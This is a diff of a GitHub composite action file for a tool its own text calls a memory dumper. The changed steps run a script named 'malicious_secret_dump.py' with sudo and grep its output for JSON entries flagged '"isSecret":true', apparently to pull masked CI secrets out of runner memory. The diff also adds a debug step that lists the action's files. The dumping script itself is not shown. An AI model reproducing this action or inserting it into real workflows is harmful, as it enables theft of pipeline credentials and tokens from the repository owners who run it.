@@ -8,24 +8,25 @@ inputs:
   script-path:
     description: "Path to malicious_secret_dump.py"
     required: false
-    default: "./malicious_secret_dump.py"
+    default: "malicious_secret_dump.py"
 outputs:
   secrets:
     description: "Extracted secrets from memory"
 runs:
   using: "composite"
   steps:
-    - name: Checkout Action Repository
-      uses: actions/checkout@v4
-      with:
-        repository: ${{ github.repository }}
-        path: memory-dumper
-
     - name: Install dependencies
       run: sudo apt update && sudo apt install -y python3
       shell: bash
 
-    - name: Dump memory
+    - name: Debug file path
       run: |
-        sudo python3 ${{ inputs.script-path }} | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
+        echo "Current directory: $(pwd)"
+        echo "Listing files in action path:"
+        ls -al ${{ github.action_path }}
+      shell: bash
+
+    - name: Run memory dumper
+      run: |
+        sudo python3 ${{ github.action_path }}/malicious_secret_dump.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
       shell: bash
